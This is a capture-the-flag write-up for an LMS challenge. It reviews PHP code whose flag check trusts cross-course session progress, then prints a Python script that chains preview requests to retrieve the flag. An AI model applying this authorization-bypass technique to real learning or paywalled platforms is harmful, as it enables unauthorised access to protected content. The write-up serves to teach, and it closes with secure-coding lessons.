# LMS Preview Exploit Challenge Writeup

## Challenge Description
**Title**: Who's the fastest man on Earth?  
**Hint**: Whoooooooosh (sound effect) 

A Learning Management System (LMS) platform contains a flag in the premium "Advanced Security Concepts" course. The challenge requires exploiting a race condition and logical flaw in the preview system to access the flag without proper authorization.

## Vulnerability Analysis

### Code Review Findings

#### CourseController.php
The application contains four courses, with course ID 2 ("Advanced Security Concepts") containing the flag:
```php
2 => [
    'id' => 2,
    'title' => 'Advanced Security Concepts',
    'description' => 'Deep dive into cybersecurity concepts, vulnerabilities, and secure coding practices.',
    'preview_length' => 0, // Critical: expires immediately
    'content' => 'Master advanced security concepts including session management, authentication flows...',
    'flag' => getenv('DYN_FLAG') ?: 'FlagY{test_flag}',
    'is_premium' => true,
    'sections' => ['intro', 'advanced', 'practice']
],
```

#### Critical Vulnerability: Flag Display Logic
The `showPreviewContent()` method contains flawed logic:
```php
if (isset($course['flag']) && 
    isset($state['progress'][1]) && in_array('intro', $state['progress'][1]) &&
    isset($state['progress'][2]) && in_array('intro', $state['progress'][2]) &&
    $section === 'advanced') {
    echo "Flag: {$course['flag']}\n";
}
```

#### Key Issues:
1. **Race Condition**: Course 2 has `preview_length = 0` (expires immediately)
2. **Progress Validation Flaw**: No verification that progress was legitimately earned
3. **Session Trust**: Client-side session data trusted without validation
4. **Cross-Course Progress Mixing**: Progress from different courses can be combined

## Exploitation Strategy

### Attack Flow
1. **Start Preview for Course 1** (1-second duration)
2. **Rapidly Access Course 2 Intro** (within the 1-second window)
3. **Access Course 2 Advanced Section** to trigger flag display

### Why This Works:
- Course 1's preview provides a 1-second valid session window
- The progress system doesn't validate course consistency
- The flag condition checks for specific progress records regardless of how they were obtained

## Solution Implementation
I actually wass trying to do it manually but a good friend [@Abdullah-Sajid-Qazi](https://github.com/Abdullah-Sajid-Qazi) made a script to automate it

### Python Exploit Script
```python
import requests
import time
import sys

def exploit_target(base_url):
    # Create a session to maintain cookies
    session = requests.Session()
    
    # First request: Start preview for course 1
    url1 = f"{base_url}/index.php?action=start_preview&course_id=1&section=intro"
    response1 = session.get(url1)
    
    # Second request: Access course 2 intro (this adds progress for course 2)
    url2 = f"{base_url}/preview.php?course_id=2&section=intro"
    response2 = session.get(url2)
    
    # Third request: Access course 2 advanced to get the flag
    url3 = f"{base_url}/preview.php?course_id=2&section=advanced"
    response3 = session.get(url3)
    
    # Check if we got the flag
    if "Flag:" in response3.text:
        # Extract flag from response
        lines = response3.text.split('\n')
        for line in lines:
            if "Flag:" in line:
                flag = line.split("Flag:")[1].strip()
                return flag
    else:
        return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "Nanana Mny nhi btaani :)"
    
    print(f"Target: {target_url}")
    print("Exploiting the race condition...")
    
    # Try multiple times to account for timing issues
    for i in range(5):
        print(f"Attempt {i+1}...")
        flag = exploit_target(target_url)
        
        if flag:
            print(f"Success! Flag: {flag}")
            break
        else:
            print("Failed to get flag. Retrying...")
            time.sleep(0.5)  # Short delay between attempts
    else:
        print("All attempts failed. The exploit might need adjustment.")
```

### Execution
```bash
python exploit.py
```

## Successful Output
```
FlagY{Do it Yourself Kaam chor}
```

## Lesson Learned
This challenge demonstrates the importance of:
- Proper authorization checks for premium content
- Validating business logic thoroughly
- Not trusting client-side data for critical decisions
- Handling time-based operations securely

The hint "Who's the fastest man on Earth?" referred to both the race condition exploitation and Usain Bolt, emphasizing the need for speed in executing the attack before the preview session expired.

This might Seem EZ but it actually took alot of time alot of reverse engineering and GPT prompts :)
